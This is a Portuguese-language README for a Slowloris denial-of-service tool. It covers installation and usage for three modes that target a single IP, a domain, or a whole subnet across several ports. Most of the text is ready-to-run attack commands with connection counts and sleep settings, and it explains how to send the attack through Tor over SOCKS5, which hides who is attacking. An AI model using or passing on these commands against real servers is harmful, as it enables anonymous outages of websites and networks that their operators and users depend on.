# Slowloris Tool

Ferramenta unificada de testes Slowloris, com três modos de execução (até o momento):

- **sniper** → ataque direcionado a um IP único  
- **domain** → ataque direcionado a um domínio (resolve via DNS)  
- **pitchfork** → teste em sub-rede + múltiplas portas de sua escolha

---

## Instalação

```bash
git clone https://github.com/CLSxSH7/slowloris-tool.git
cd slowloris-tool
pip install -r requirements.txt
```

Para suporte a proxy **SOCKS5**, instale também:

```bash
pip install PySocks
```

---

## Uso

### Menu interativo

Se executar sem parâmetros:

```bash
python slowloris-tool.py
```

Você verá um menu para escolher entre **sniper**, **domain** e **pitchfork**, com prompts para cada parâmetro.

---

### Modo sniper (IP único)

```bash
python slowloris-tool.py sniper 192.168.0.10 -p 80 -s 200 --https -ua --sleeptime 10
```

Com proxy SOCKS5 (ex.: Tor):

```bash
python slowloris-tool.py sniper 192.168.0.10 -p 80 --socks5 127.0.0.1:9050
```

---

### Modo domain (Domínio)

```bash
python slowloris-tool.py domain example.com -p 443 --https -s 200 -ua
```

Com proxy SOCKS5:

```bash
python slowloris-tool.py domain example.com -p 443 --https --socks5 127.0.0.1:9050
```

---

### Modo pitchfork (Sub-rede/Portas)

```bash
python slowloris-tool.py pitchfork 192.168.0.0/24 -P 80,8080,443 -s 200 -t 50 -d 120
```

> ⚠️ Neste modo, **não há suporte a SOCKS5** (execução direta).

---

## Dependências

- Python 3.9+
- `requests`
- `PySocks` (apenas se for usar `--socks5`)

---

## Observações

- O parâmetro `--socks5` é suportado somente nos modos **sniper** e **domain**.  
- O proxy é aplicado globalmente via `socket` monkeypatch.  
- Para rodar via **Tor**, certifique-se de ter o serviço ativo na porta 9050:

```bash
tor &
python slowloris-tool.py domain target.com --socks5 127.0.0.1:9050
```

---